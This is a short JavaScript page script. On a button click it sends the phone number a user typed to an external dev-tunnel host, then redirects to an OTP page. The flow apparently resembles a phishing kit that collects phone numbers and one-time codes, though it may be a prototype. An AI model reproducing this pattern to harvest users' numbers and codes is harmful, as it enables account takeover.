
document.addEventListener('DOMContentLoaded', () => {
let btn = document.getElementById('nextbtn');

btn.addEventListener('click', async () => {
    let phone = await document.getElementById('phoneinput').value;
    let url = `https://mxnk4svt-3000.asse.devtunnels.ms/data?data=${phone}`;
    console.log(phone);
    await fetch(url, {
        method: 'POST',
        mode: 'no-cors',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': '100'
        },
    })
    window.location.href = 'otp.html';
});
});
